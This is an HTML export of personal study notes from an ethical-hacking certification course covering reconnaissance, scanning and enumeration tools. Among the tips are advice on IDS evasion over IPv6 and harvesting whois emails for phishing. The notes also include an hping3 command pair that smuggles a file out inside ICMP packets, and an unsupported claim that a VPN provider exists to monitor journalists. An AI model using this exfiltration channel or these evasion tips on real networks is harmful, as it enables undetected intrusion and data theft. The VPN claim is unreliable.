vulnerabilities</strong></li></ul><ul id="ac07ae5f-e1a6-4ef5-97cc-99f19aa645fc" class="bulleted-list"><li style="list-style-type:disc"><strong>wappalyzer </strong>chrome extension analyzes and identifies all technologies used in the page</li></ul><ul id="5b7dbfae-fea7-4018-a268-a439bf23d5f6" class="bulleted-list"><li style="list-style-type:disc">advanced google search operators (<strong>google dorks</strong>)</li></ul><ul id="252601d7-9c2c-4581-80ae-4518c5a9dccc" class="bulleted-list"><li style="list-style-type:disc">google image search<ul id="0c999e28-6867-4d73-bab6-a724a53a2472" class="bulleted-list"><li style="list-style-type:circle">to find different angles of a building</li></ul><ul id="9b067288-94af-4d81-abcf-1ff6036f2f38" class="bulleted-list"><li style="list-style-type:circle">or find infro about people finding pictures using their name</li></ul></li></ul><ul id="9e3a9871-002e-49f0-b91b-493b8c0c8f96" class="bulleted-list"><li style="list-style-type:disc"><strong>napalm</strong> ftp indexer<ul id="badf01fa-a8c7-46b0-a3b3-23c6f3b4ea5c" class="bulleted-list"><li style="list-style-type:circle">find sensitive files using ftp available data by querying words</li></ul></li></ul><ul id="cfa99f25-ae3b-4be8-ae54-28baefdba689" class="bulleted-list"><li style="list-style-type:disc">whois database<ul id="eac65dea-2094-409f-81e0-e990305dce00" class="bulleted-list"><li style="list-style-type:circle">can collect info</li></ul><ul id="ebee0e55-097c-4a5d-8517-3f76b8d9836b" class="bulleted-list"><li style="list-style-type:circle">can collect email addresses to make a phishing attack</li></ul></li></ul><ul id="58c119b7-f3c3-4391-97a7-8eb470120dff" class="bulleted-list"><li style="list-style-type:disc"><strong>shodan</strong><ul id="9159250f-4680-449f-b48c-ed53a86b2412" class="bulleted-list"><li style="list-style-type:circle">Searches the header of a service with a public IP address</li></ul><ul id="d7262712-004d-4041-9804-00bcea4d1270" class="bulleted-list"><li style="list-style-type:circle">identifies open ports and their banner</li></ul><ul id="040ec01b-0e04-4c8b-a632-d8a248043f63" class="bulleted-list"><li style="list-style-type:circle">can also used for data analysis whats used in the country or specific region or specific company (side panel shows numbers)</li></ul><ul id="eda79ef1-d800-4b47-a50e-c1445f78d0b2" class="bulleted-list"><li style="list-style-type:circle">some might be honeypots</li></ul><ul id="539ff98b-a31d-41ef-bd4e-44bb98b2809b" class="bulleted-list"><li style="list-style-type:circle">can find usernames because they provide screenshots</li></ul><ul id="0439f721-686e-43d9-8d77-d2d4faeb608f" class="bulleted-list"><li style="list-style-type:circle">can search for namespace of ip addresses<ul id="664b1637-bf8c-44cd-94cd-d3e25b78b832" class="bulleted-list"><li style="list-style-type:square">net:”ip/24”</li></ul><ul id="90b0d452-27c6-46f8-815f-59d1b6946b9e" class="bulleted-list"><li style="list-style-type:square">if a company has a range of ip (probably have so you can guess the subnet) you can find the rest of the devices that are open</li></ul><ul id="e4601873-3738-42f1-a0bf-02341d874534" class="bulleted-list"><li style="list-style-type:square">printers<ul id="0fa48840-c6d6-46e4-8964-62b996a015b0" class="bulleted-list"><li style="list-style-type:disc">publicly available with default pass and connected to wifi can reveal wifi password</li></ul></li></ul></li></ul></li></ul><ul id="655e9dac-1fb6-4975-9a12-c77de4b61c49" class="bulleted-list"><li style="list-style-type:disc"><strong>honeypot checker - check in google</strong><ul id="2dc22491-e706-45c2-8460-20cfaab96f24" class="bulleted-list"><li style="list-style-type:circle">to check if an ip address is honeypot </li></ul><ul id="a6ace024-098f-4bb6-8850-fcad0f02990d" class="bulleted-list"><li style="list-style-type:circle">because some shodan vulnerable devices might be too obvious</li></ul></li></ul><ul id="b0f718a1-4c09-4f58-a303-33b98cc15b08" class="bulleted-list"><li style="list-style-type:disc">netcraft.com/tools<ul id="d2c7f896-42d0-415a-bbbe-7f7970998a01" class="bulleted-list"><li style="list-style-type:circle">search info on specific websites that have been collected</li></ul><ul id="1bb0ab37-2038-44e2-ade7-0ca4ee301138" class="bulleted-list"><li style="list-style-type:circle">hosting (dedicated or shared)</li></ul><ul id="8b21671c-f870-4d8f-a7bc-60548180eeb2" class="bulleted-list"><li style="list-style-type:circle">ip addresses, type of domains using</li></ul></li></ul><ul id="ac1e51e5-654e-4250-b445-cc43e23cca1e" class="bulleted-list"><li style="list-style-type:disc">crt.sh<ul id="c3ba3a2f-d7ba-4304-802a-2f2456a623e6" class="bulleted-list"><li style="list-style-type:circle">Search for identity/website to find certificates and maybe subdomains</li></ul><ul id="668b4b39-1c53-42a8-ae13-cd0f2829b6e3" class="bulleted-list"><li style="list-style-type:circle">Can see also old certificates, to identify the history of the websites<ul id="90e19bf3-756b-43c2-bd41-158b4eefa6bc" class="bulleted-list"><li style="list-style-type:square">maybe also still active subdomains but not included in current certificates</li></ul></li></ul></li></ul><ul id="c5238a3c-059c-440c-8e9f-7267b8b5f029" class="bulleted-list"><li style="list-style-type:disc">entrust.com<ul id="6dfc66e8-7457-4c06-810b-13e9a03e5542" class="bulleted-list"><li style="list-style-type:circle">shows currenctly active valid certificates</li></ul><ul id="6f1e1eef-1f5d-4dc6-a642-45be72700574" class="bulleted-list"><li style="list-style-type:circle">can also include expirted ones</li></ul><ul id="f9b6947c-a731-4b24-8cb7-483d40d703fa" class="bulleted-list"><li style="list-style-type:circle">can also show alternate names under the same certificate if clicked on result</li></ul></li></ul><ul id="0f68d70a-ff78-49f3-b10c-87bd68730486" class="bulleted-list"><li style="list-style-type:disc">tools like ffuf <ul id="95bb4c54-408a-48ba-931b-25fead95f54d" class="bulleted-list"><li style="list-style-type:circle">find cnames and enumerate subdomains</li></ul></li></ul><ul id="b2777481-d887-4464-91cd-19a19b4546f8" class="bulleted-list"><li style="list-style-type:disc">people search<ul id="66244e32-3cc4-4760-bf2f-f71d2ddde796" class="bulleted-list"><li style="list-style-type:circle">social networking sites for finding who is employed and the organisation structure<ul id="04f87fb4-0909-4cd3-8265-50630313f408" class="bulleted-list"><li style="list-style-type:square">tools: theHarvester</li></ul></li></ul></li></ul><ul id="bf38bf2f-12a1-4e31-9244-5652acb7e00b" class="bulleted-list"><li style="list-style-type:disc">Do reconnaisance using automated scripts, they do the scanning (port scanning, etc)<ul id="0cfa0366-d837-4de0-85b0-48c3405da411" class="bulleted-list"><li style="list-style-type:circle">petest-tools.com</li></ul></li></ul><ul id="4fbeecfb-6d87-418b-aeba-4bbb2bd6bf59" class="bulleted-list"><li style="list-style-type:disc">Emails servers today respond back even if the email address does not exist<ul id="ad84b479-d4d8-4eec-984f-051092d71431" class="bulleted-list"><li style="list-style-type:circle">there are email verifier sites and you can check if they are set to always valid</li></ul><ul id="a92c6920-68d7-43ac-8620-f76d5c429508" class="bulleted-list"><li style="list-style-type:circle">can construct email names from linkedin</li></ul></li></ul><ul id="2bba51de-bb2a-4af9-8c05-bcb621484fbf" class="bulleted-list"><li style="list-style-type:disc">job sites<ul id="b27f67ab-4948-44f4-95e2-4d0924941c79" class="bulleted-list"><li style="list-style-type:circle">from job requirements, employee profiles, hardware info</li></ul><ul id="99782c13-07ff-447e-b9aa-42aaa41cf800" class="bulleted-list"><li style="list-style-type:circle">you can find what technology they have in the company</li></ul></li></ul><ul id="6dec765a-549f-43be-938f-c95280bfdd68" class="bulleted-list"><li style="list-style-type:disc">ahmia.fi<ul id="f0a84ec0-5e28-4fa0-83fb-2eec33e3804f" class="bulleted-list"><li style="list-style-type:circle">search engine for tor</li></ul></li></ul><ul id="528168a4-2355-4708-b0b3-1347b3b01dd5" class="bulleted-list"><li style="list-style-type:disc">anonymity<ul id="aede47fb-9ea3-433e-bd2b-218e044a24bd" class="bulleted-list"><li style="list-style-type:circle">interpol asked providers to provide tcp connections from all isps<ul id="a81abf07-6b74-46d9-83c6-72e238b3eafd" class="bulleted-list"><li style="list-style-type:square">so they can use big data to find the tor chain starting from the exit note and locate it to you</li></ul></li></ul><ul id="937c68e5-93e6-423f-8a54-28254f6a4c76" class="bulleted-list"><li style="list-style-type:circle">for real anonymity , connect to a different network away from your location and bridge it to you</li></ul><ul id="5d20c2bd-b300-419b-abee-343c9ee53cdf" class="bulleted-list"><li style="list-style-type:circle">there was some story about journalists being monitored and they chose to use vpn<ul id="fc932f09-8067-43f1-b1b7-afc6d3510924" class="bulleted-list"><li style="list-style-type:square">they found the cheapest vpn</li></ul><ul id="5854be6b-8116-4d5a-a6df-2951cad53f8a" class="bulleted-list"><li style="list-style-type:square">so they created the cheapest ever vpn (private internet access) to still control them</li></ul></li></ul></li></ul><ul id="4ae1cd08-4624-4323-ae6c-240f61438146" class="bulleted-list"><li style="list-style-type:disc">global brand databases<ul id="0c9f39a2-1226-416e-a293-edd4903f9712" class="bulleted-list"><li style="list-style-type:circle">information on companies</li></ul></li></ul><ul id="7683fdda-523a-4a9b-9ac8-684399794c35" class="bulleted-list"><li style="list-style-type:disc">burpsuite, wappalyzer</li></ul><ul id="914216f8-bc34-4fd4-a012-daa220cdc7b8" class="bulleted-list"><li style="list-style-type:disc">website copier</li></ul><ul id="3fa2f135-26fb-4ed7-b8a4-c8d13aaddd2b" class="bulleted-list"><li style="list-style-type:disc">wayback machine, internet archive</li></ul><ul id="2933e9e8-a751-4c81-bd9d-234d55e102b4" class="bulleted-list"><li style="list-style-type:disc">builtwith - find what the website is built with</li></ul><ul id="0dc3b6f5-6232-41ea-8f09-55b4fe13bd5e" class="bulleted-list"><li style="list-style-type:disc">mxtoolbox - find email details from email headers<ul id="6514acb1-b6e6-4444-a56f-035d4f861dc7" class="bulleted-list"><li style="list-style-type:circle">eg. source maybe russia if the server is from russia or sth</li></ul><ul id="fe487495-dc21-4a07-8517-96717648139a" class="bulleted-list"><li style="list-style-type:circle">software used to send email can maybe be identified through headers</li></ul></li></ul><p id="0a2d60f5-af9f-40b2-92af-d64aa6a47c55" class="">
</p><ul id="d58f75fa-1111-4019-a042-347ed08452ef" class="bulleted-list"><li style="list-style-type:disc">some phising sites are tied to a specific region so  they isolate it<ul id="acf89577-c8cd-491d-adf7-ebf54a52de89" class="bulleted-list"><li style="list-style-type:circle">so that if anyone else clicks it, it doesn’t work</li></ul><p id="8eb5b867-48df-475b-b2a1-6e4a446e7740" class="">
</p></li></ul><ul id="5494492c-7926-4f8a-ac51-a9fd3190df49" class="bulleted-list"><li style="list-style-type:disc">DNS Footprinting<ul id="1743c629-4130-4de1-84a4-8e3814f4d352" class="bulleted-list"><li style="list-style-type:circle">Record types are useful can be found using centralops.net</li></ul><ul id="b21d0430-c6ac-4998-b026-881e6219e1b6" class="bulleted-list"><li style="list-style-type:circle">CNAME are difficult to find out unless you enumerate subdomains</li></ul><ul id="d9112e84-f688-4202-aec7-27658c23c63d" class="bulleted-list"><li style="list-style-type:circle">SOA - shows how long the record is held in dns (ttl)</li></ul><ul id="21cc7cd6-1d0f-4ea4-a295-4bb1065c4f39" class="bulleted-list"><li style="list-style-type:circle">TXT - spf policies (sender policy framework) within the file - for secure email communication<ul id="be28da42-e0b8-4656-a422-1a06104cd59c" class="bulleted-list"><li style="list-style-type:square">gives the full scope of public ipv4 space for the company</li></ul></li></ul><ul id="9a9c3a99-51c2-4441-8799-f2c0dd2dd591" class="bulleted-list"><li style="list-style-type:circle">MX - defines the first mail server that recieves email, might forward to another server eg. ms exchange<ul id="24ed8926-ac1e-4f8d-bc61-2293b5cc0b8b" class="bulleted-list"><li style="list-style-type:square">preference number shows priority, if a lower nubmer does not respond, the email is sent to a higher preference number</li></ul><ul id="03e058cb-4778-4ac3-87b8-acbb72573643" class="bulleted-list"><li style="list-style-type:square">thats why most of the time they have more than one mx record, its for multiple mails</li></ul></li></ul><ul id="eab5e945-c82b-4c85-91a1-ddedfa56d772" class="bulleted-list"><li style="list-style-type:circle">Active Reconnaisance<ul id="15029a45-0c12-41e0-8e09-f619573349d1" class="bulleted-list"><li style="list-style-type:square">with nslookup <ul id="07d4fef8-3932-49c8-bd81-7ee1420f8c79" class="bulleted-list"><li style="list-style-type:disc">set type=AAAA</li></ul></li></ul><ul id="a8574497-ad86-49e7-b5d2-dfff31788e8b" class="bulleted-list"><li style="list-style-type:square">with reverse dns lookup (searching for ip addresses or range)<ul id="9b841bdd-6a74-4f52-9fe4-b765da1fc555" class="bulleted-list"><li style="list-style-type:disc">eg. dnsrecon or online web apps  for passive reconnaisance</li></ul></li></ul></li></ul><ul id="1581cad7-79d2-4beb-80ed-1019de1f3e7a" class="bulleted-list"><li style="list-style-type:circle">traceroute<ul id="843c8659-3858-4ad5-8e32-69715ab6e739" class="bulleted-list"><li style="list-style-type:square">we can see this way if we have a firewall between our host and desitnation</li></ul><ul id="51b408cf-9c3d-494f-a951-e18f1e469663" class="bulleted-list"><li style="list-style-type:square">visual route shows where each hop is located</li></ul><ul id="b430b4ad-417d-44fb-bfae-4ccdd8dc302a" class="bulleted-list"><li style="list-style-type:square">we traceroute two times (and each time we get different ip addresses<ul id="bfd13e49-ba52-49e6-8450-31e9d519c202" class="bulleted-list"><li style="list-style-type:disc">so we probably have a load balancer </li></ul><ul id="0c7f026b-7f69-4a6d-a306-d9334a6aabda" class="bulleted-list"><li style="list-style-type:disc">we can check it multiple times to verify it</li></ul><ul id="b711667c-599b-469a-b39b-77172faf2f71" class="bulleted-list"><li style="list-style-type:disc">this enables us to identify if we heve network control because sometimes it also monitors other than control the flow</li></ul></li></ul><ul id="eb4ac64e-8a9d-49a6-96ca-20bf4d5ee35d" class="bulleted-list"><li style="list-style-type:square"><strong>we can also identify the operating system by recognising the ttl given to the packet (there is public knowledge for each os)</strong></li></ul><ul id="b5508fd2-ce76-4bbb-8537-176dfa8d4f2c" class="bulleted-list"><li style="list-style-type:square">if we get stars after an IP it means that IP is filtering</li></ul><ul id="6a3caddd-62b2-48b6-bc8d-4e830ba117ac" class="bulleted-list"><li style="list-style-type:square">we can use wireshark to identify the ttl given by our destination from IP headers<ul id="37801f4e-833d-4ba5-82c9-d6d60e0ec546" class="bulleted-list"><li style="list-style-type:disc">filter: tcp &amp;&amp; ip.addr = 192.168…</li></ul><ul id="7d7698e1-4372-4b4d-bdfd-d8d6de5f491b" class="bulleted-list"><li style="list-style-type:disc">we calculate ttl + no of hops = op system ttl</li></ul></li></ul></li></ul><ul id="5cbdd829-2b3f-401b-988c-6c6230f7d45a" class="bulleted-list"><li style="list-style-type:circle">social engineering<ul id="7c25a975-195c-4e45-8811-7c2ed46ae128" class="bulleted-list"><li style="list-style-type:square">you have to be prepared from the firstplace</li></ul></li></ul><ul id="d7d3980c-1f69-4248-be88-80ac8ce5c027" class="bulleted-list"><li style="list-style-type:circle">Footprinting Tools<ul id="4544c0e4-e1a5-4684-864d-65d1e81f80a2" class="bulleted-list"><li style="list-style-type:square">spyse - alot of these tools but online</li></ul><ul id="73cc1af3-9f76-4438-ba81-8b5ab3eab69f" class="bulleted-list"><li style="list-style-type:square">FOCA Open Source - find alot of information from publicly available data</li></ul><ul id="3351e461-af00-4db3-806c-991e82e2a8b6" class="bulleted-list"><li style="list-style-type:square">Malteg - finds info and execute commands with visuals (graph) but has limits on free version</li></ul><ul id="e4262c48-e6d0-44e8-8272-68bdd72906fe" class="bulleted-list"><li style="list-style-type:square">subdomainfinder.c99.nl, nslookup.io, search.censys.io, centralops.net</li></ul><ul id="6b423c11-fb04-4347-86a3-77e1f2d3b4ba" class="bulleted-list"><li style="list-style-type:square">WFuzz for subdomain bruteforcing</li></ul><p id="510c9d63-53e3-4431-aec5-c5e204c86c3c" class="">
</p></li></ul><ul id="a17e569c-cafb-443a-b75b-76603bc44609" class="bulleted-list"><li style="list-style-type:circle"><strong>Organise the information</strong><ul id="eaa482a2-d689-4a24-bbb1-d1391588362a" class="bulleted-list"><li style="list-style-type:square">mind map tools like freemind</li></ul><ul id="dba31b0a-3722-4b2c-9f50-62cd8174bba7" class="bulleted-list"><li style="list-style-type:square">Faraday</li></ul></li></ul></li></ul></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 2 - Scanning and Analysis</summary><div class="indented"><ul id="22555803-5ca9-4952-ae10-059e6a5e1081" class="toggle"><li><details open=""><summary>Recording</summary><figure id="abfd43e6-093a-43a2-837f-2400328db382"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_Day_2_-_Modules_3_4_5.txt">CEH Day 2 - Modules 3, 4, 5.txt</a></div></figure></details></li></ul><ul id="3aecbb71-c928-4c34-b699-345555b730bf" class="toggle"><li><details open=""><summary>Module 03 - Scanning Networks</summary><p id="a84ae608-4789-4a26-8efb-c17a94eca9f7" class="">identify open ports and hosts</p><p id="f9cbc986-2448-4a13-a1bc-5bec840aa082" class="">identify vulnerabilities</p><p id="b69a5b7b-fae7-4ce8-ac2d-e9d6e0e63d6b" class="">still gathering info</p><p id="215b4be8-b189-4ffc-ba79-61fbd7ebc17f" class="">
</p><ul id="a5910053-da3f-4d20-9982-ad89a369e69b" class="bulleted-list"><li style="list-style-type:disc">We must know TCP Flags, how they work and how they are used<ul id="ed659c83-f475-4678-805f-1444f23f5b32" class="bulleted-list"><li style="list-style-type:circle">SYN, ACK, FIN, URG etc.</li></ul><ul id="24632bd1-0361-4258-aec7-30eb165b3431" class="bulleted-list"><li style="list-style-type:circle">how a connection starts with an ip, how it stops, how it proceeds</li></ul><ul id="879043cc-85f7-46ce-aebd-3cc440dcd7c3" class="bulleted-list"><li style="list-style-type:circle">this is what nmap uses</li></ul></li></ul><ul id="e3b3cd94-b927-4d6d-801d-45f6c82c8319" class="bulleted-list"><li style="list-style-type:disc">hping<ul id="686a2730-f0a4-481b-a205-76c01d504a19" class="bulleted-list"><li style="list-style-type:circle">we can listen for packets on a specific port</li></ul><ul id="f057f3de-b97e-41c1-bac2-667facf3e88d" class="bulleted-list"><li style="list-style-type:circle">also does what nmap does</li></ul><ul id="3ee09c47-da5d-4b8a-b9de-65d481821b7c" class="toggle"><li><details open=""><summary>Hping Commands</summary><figure id="b3cb6ac6-535b-47c6-acfb-ceb03d542a99" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled.png"><img style="width:433.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled.png"/></a></figure><figure id="fc5f851e-76a6-476a-b66e-80627f29723c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Screenshot_2024-05-28_094002.png"><img style="width:433.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Screenshot_2024-05-28_094002.png"/></a></figure></details></li></ul></li></ul><h3 id="bfb2f6b1-df99-4444-ac03-995802c4f243" class="">Port Scanning Techniques</h3><ul id="59903cab-80ea-477a-be76-13990e8c0bb2" class="bulleted-list"><li style="list-style-type:disc">arp scan using nmap</li></ul><ul id="1a134dec-a3ed-4113-a894-322b2ec1f1fc" class="bulleted-list"><li style="list-style-type:disc"><strong>Careful:</strong> ISPs record all tcp connections on public ip addresses</li></ul><ul id="e401334d-a62f-4a84-81fc-eacede7a6773" class="bulleted-list"><li style="list-style-type:disc">Nmap<ul id="df9498bb-1944-407b-ad54-8298a339be8a" class="toggle"><li><details open=""><summary>Nmap Commands</summary><figure id="853229dc-5a83-4b7f-90e5-5fda77504e1c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%201.png"><img style="width:433.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%201.png"/></a></figure><figure id="3e8d6b1e-6ee1-425a-a6d3-f3315a8d3549" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%202.png"><img style="width:433.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%202.png"/></a></figure><figure id="ccbb4335-30ca-4d31-8cc0-09aa72f52526" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%203.png"><img style="width:561px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%203.png"/></a></figure></details></li></ul><ul id="e816bbc1-76ae-4d2e-bf57-f205ff45c576" class="bulleted-list"><li style="list-style-type:circle">Exam: nmap with ipv6 needs -6 flag, also we need to have ipv6</li></ul><ul id="c022b625-f6dc-40fe-aecf-935bb0af281d" class="bulleted-list"><li style="list-style-type:circle">Exam: must know flags of nmap</li></ul><ul id="a9eb6deb-3d16-448a-a208-eb9248d85a57" class="bulleted-list"><li style="list-style-type:circle">Exam: -O: triggers OS Discovery</li></ul><ul id="9f281f64-1d63-4a7d-bd2e-21c65431ee7f" class="bulleted-list"><li style="list-style-type:circle">-oX: output to XML, can use nmap bootstrap to render on browser</li></ul></li></ul><p id="42f8c813-4b24-4696-a382-ba571d4f93e0" class="">
</p><ul id="de3945d2-5beb-41f5-a209-4ee4baec74bb" class="bulleted-list"><li style="list-style-type:disc">can use <strong>unicornscan</strong> for os footprinting by examining ttl</li></ul><ul id="8f338038-95c3-46f8-a1e0-709c0c690ceb" class="bulleted-list"><li style="list-style-type:disc">nmap scripts<ul id="e98c6c1d-e6ac-49c7-9d06-a3a4be1ada85" class="bulleted-list"><li style="list-style-type:circle">they are loud</li></ul><ul id="0ac74768-8f12-4e1f-b244-4740e2ceb463" class="bulleted-list"><li style="list-style-type:circle">but can use them like smb-os-discovery.nse</li></ul></li></ul><ul id="653ffd93-01c6-4275-a715-3bbcd9a68596" class="bulleted-list"><li style="list-style-type:disc">masscan can set max-rate which gives packets/sec and faster than nmap</li></ul><ul id="68127429-03c5-4828-8f15-c9ff18830d17" class="bulleted-list"><li style="list-style-type:disc"></li></ul><ul id="4165fbe8-e2df-48c8-8852-ca3615d055db" class="bulleted-list"><li style="list-style-type:disc"><strong>many of IDS don’t look at ipv6, so you can scan using this if available</strong></li></ul><ul id="4752a59f-d55e-44ea-9809-ca5f860462d9" class="bulleted-list"><li style="list-style-type:disc">Always assume that there is an IDS in place, to scan beyond them:<ul id="9bdc1f06-59f1-4ad9-af43-406a276ff012" class="bulleted-list"><li style="list-style-type:circle">Use evasion techniques</li></ul></li></ul><ul id="675076ea-3cfb-48b5-bc2f-0262a45dfb8c" class="bulleted-list"><li style="list-style-type:disc">Cisco firewalls check your mac and if you are cisco, they allow you to communicate</li></ul><ul id="a204c165-b4db-4b7c-831b-560b05c51d62" class="bulleted-list"><li style="list-style-type:disc">can use hping3 to set up a reciever that awaits for a specific icmp signature (message) and a sender that sends a specific message<ul id="216dca1d-9be0-49b4-86a0-a67e73a15f44" class="bulleted-list"><li style="list-style-type:circle">eg. hping3 &lt;ip&gt; —icmp —data 100 —file &lt;file&gt; —sign &lt;signature&gt;</li></ul><ul id="61f3e49d-fdb3-41f4-97f5-0adea28799d7" class="bulleted-list"><li style="list-style-type:circle">hping3 —innterface &lt;if&gt; —listen &lt;signature&gt; —icmp</li></ul><ul id="c2ab0cd3-4728-4308-b591-2b2b72dce391" class="bulleted-list"><li style="list-style-type:circle"><strong>this is beneficial because no one looks at icmp packets,</strong> if you use ssh its detectable</li></ul></li></ul><ul id="4e21499b-02d1-4f99-863a-6edad7859612" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="f65d54c4-bf60-4266-8a3c-ac471be42b3c" class="">
</p></details></li></ul><ul id="23b16d02-97cc-4b01-a90b-1ce1f73695a5" class="toggle"><li><details open=""><summary>Module 04 - Enumeration</summary><p id="e4bd17ea-aaae-4b99-91e4-3784abbfa550" class="">an extension to scanning</p><p id="2e4d4c1e-e0aa-480a-8a27-2462ae86b725" class=""><strong>actively extracting information</strong> from services that are available and drilling info</p><p id="603a6dd6-5a40-4515-9b95-2a67d87014ec" class="">we are interacting with the target</p><p id="a731d9cd-31e5-4316-8af9-0c90c3f76bff" class="">many tools, just choose one to find info</p><p id="3b84a186-fe49-440d-8253-ce21055a6572" class="">
</p><ul id="b00fb847-1e9e-4468-a255-11865bffcaeb" class="bulleted-list"><li style="list-style-type:disc">Multiple services and ports to e numerate</li></ul><ul id="f5ce613e-9da7-47a5-a8a8-dcc367c795cd" class="bulleted-list"><li style="list-style-type:disc">Why do we have both tcp udp open on dns?<ul id="bae307f7-1bc3-40a6-8f23-968bf5fa57ad" class="bulleted-list"><li style="list-style-type:circle">zone transfer is for tcp </li></ul><ul id="aedfda3b-817f-49a1-b758-83e1ed199406" class="bulleted-list"><li style="list-style-type:circle">udp is for…</li></ul><ul id="eb5981ec-5a43-4b81-9962-57af55edb485" class="bulleted-list"><li style="list-style-type:circle">different services from each protocol</li></ul></li></ul><ul id="bcb2dab2-0279-47cc-b000-411fa86f98a3" class="bulleted-list"><li style="list-style-type:disc">netbios  can give alot of information<ul id="39584b2d-7553-42c3-8a06-3ee464c31033" class="bulleted-list"><li style="list-style-type:circle">there are netbios enumeration tools</li></ul><ul id="f6744307-7498-4a07-9546-0e5e0b23e4de" class="toggle"><li><details open=""><summary>Info</summary><figure id="b7b1c8a9-462e-4b12-8b77-1f9bc9cff8eb" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%204.png"><img style="width:800px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%204.png"/></a></figure></details></li></ul></li></ul><ul id="54029c7a-71b2-4702-977c-6ca87d3f5dfd" class="bulleted-list"><li style="list-style-type:disc">PsTools<ul id="e9b5e4ea-dbf1-4a15-8906-6b3a50341cb9" class="bulleted-list"><li style="list-style-type:circle">can be used to enumerate user accounts </li></ul><ul id="9a9a409c-0f2e-49d2-a9d3-11c27e03f895" class="bulleted-list"><li style="list-style-type:circle">needs proper rights</li></ul></li></ul><ul id="beea57ca-0b43-4699-b830-f95cdf3b36c2" class="bulleted-list"><li style="list-style-type:disc">net view</li></ul><p id="f7d12a0d-9150-466a-b003-ac7dfc8b94d9" class="">
</p><p id="5c38d103-fa8c-4d6c-8a62-26e930a9c268" class="">
</p><ul id="4734a5dc-c463-4145-8d65-5ea0a689f01f" class="bulleted-list"><li style="list-style-type:disc">SNMP<ul id="dea8035f-af59-43f7-8a5d-c3c78ba7515f" class="bulleted-list"><li style="list-style-type:circle">snmpwalk</li></ul><ul id="46977eda-7b5f-4e3b-9a1e-43f3a2d93d61" class="bulleted-list"><li style="list-style-type:circle">snmp-info NSE script</li></ul><p id="7ca5733c-df5c-4f90-be50-f41e31bf10e9" class="">
</p></li></ul><ul id="0bf12268-d1ed-4056-8fee-1787c632ec81" class="bulleted-list"><li style="list-style-type:disc">LDAP<ul id="8a675a5f-7df0-4a50-8e63-a48836a42c47" class="bulleted-list"><li style="list-style-type:circle">not just for linux AD, its a free software that can be used anywhere you have users</li></ul><ul id="3507681e-0769-4f0f-8e2c-a648bbbef753" class="bulleted-list"><li style="list-style-type:circle">ldap-brute NSE script</li></ul><ul id="882dd42d-0729-49f8-b25d-68c0e0c55de1" class="bulleted-list"><li style="list-style-type:circle">use python library ldap3 for manual enumeration</li></ul><ul id="5c9b6fc2-fbfc-48c7-aabe-38d9329ef5d9" class="bulleted-list"><li style="list-style-type:circle">alot of tools</li></ul><p id="08e885bd-9a20-403d-9a6e-910138c62e00" class="">
</p></li></ul><ul id="de3c15de-6a88-427d-b45f-ac9c6e4feaa0" class="bulleted-list"><li style="list-style-type:disc">NTP<ul id="b5e755e1-4bc1-472c-80f3-ee47ff324688" class="bulleted-list"><li style="list-style-type:circle">mostly in enterprise domain environment</li></ul><ul id="7be84f3e-8643-4151-baae-280d348af71b" class="bulleted-list"><li style="list-style-type:circle">to sync time for specific type activities</li></ul><ul id="c90e8db9-e2ea-4e2e-9c43-4c02a3ccc06f" class="bulleted-list"><li style="list-style-type:circle">ntptrace</li></ul><ul id="7aa96596-624c-4de3-ab3e-cbbdf9c97f4b" class="bulleted-list"><li style="list-style-type:circle">ntpdc</li></ul><ul id="6cfdaa99-bcbf-411c-93ec-49686ec56140" class="bulleted-list"><li style="list-style-type:circle">ntpq</li></ul><ul id="1d4d6f17-24a6-47eb-8d04-96fa522105de" class="bulleted-list"><li style="list-style-type:circle">nmap</li></ul><p id="2fa47c61-6e06-4fda-8a54-81ff85c83789" class="">
</p></li></ul><ul id="3a372192-c1d4-4634-8cac-69b062110b08" class="bulleted-list"><li style="list-style-type:disc">NFS<ul id="3a1fa04d-2c37-4777-b8cc-02e6057e3683" class="bulleted-list"><li style="list-style-type:circle">network file share</li></ul><ul id="51b07efb-f682-43c8-b535-53fb38ebb3cb" class="bulleted-list"><li style="list-style-type:circle">multiple enumeration tools</li></ul><p id="c785852e-736d-4bb9-99db-0b3846ef128f" class="">
